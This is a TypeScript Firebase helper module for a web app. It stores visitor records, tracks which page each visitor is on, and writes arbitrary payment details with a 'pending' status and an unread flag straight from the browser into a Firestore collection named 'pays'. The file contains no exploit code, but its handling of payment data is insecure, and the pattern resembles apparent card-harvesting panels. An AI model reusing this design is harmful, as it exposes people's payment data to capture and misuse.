import { getApp, getApps, initializeApp, FirebaseApp } from 'firebase/app';
import { getDatabase, Database } from 'firebase/database';
import { doc, getFirestore, setDoc, getDoc, Firestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  databaseURL: import.meta.env.VITE_FIREBASE_DATABASE_URL,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId: import.meta.env.VITE_FIREBASE_MEASUREMENT_ID
};

const isFirebaseConfigured = Boolean(
  firebaseConfig.apiKey &&
  firebaseConfig.projectId
);

let app: FirebaseApp | null = null;
let db: Firestore | null = null;
let database: Database | null = null;

if (isFirebaseConfigured) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
  db = getFirestore(app);
  if (firebaseConfig.databaseURL) {
    database = getDatabase(app);
  }
} else {
  console.warn('Firebase is not configured. Please set the required environment variables.');
}

export async function getData(id: string) {
  if (!db) {
    console.warn('Firebase not configured - getData skipped');
    return null;
  }
  try {
    const docRef = doc(db, 'pays', id);
    const docSnap = await getDoc(docRef);
    
    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error('Error getting document: ', e);
    return null;
  }
}

export async function addData(data: any) {
  if (typeof localStorage !== 'undefined') {
    localStorage.setItem('visitor', data.id);
  }
  if (!db) {
    console.warn('Firebase not configured - addData skipped');
    return;
  }
  try {
    const docRef = doc(db, 'pays', data.id!);
    await setDoc(docRef, { 
      ...data, 
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      isUnread: true
    }, { merge: true });

    console.log('Document written with ID: ', docRef.id);
  } catch (e) {
    console.error('Error adding document: ', e);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem('visitor');
  if (visitorId) {
    addData({ id: visitorId, currentPage: page });
  }
}

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn('Firebase not configured - handlePay skipped');
    return;
  }
  try {
    const visitorId = typeof localStorage !== 'undefined' ? localStorage.getItem('visitor') : null;
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
  }
};

export const generateVisitorId = () => {
  return 'visitor_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export { db, database, setDoc, doc, isFirebaseConfigured };
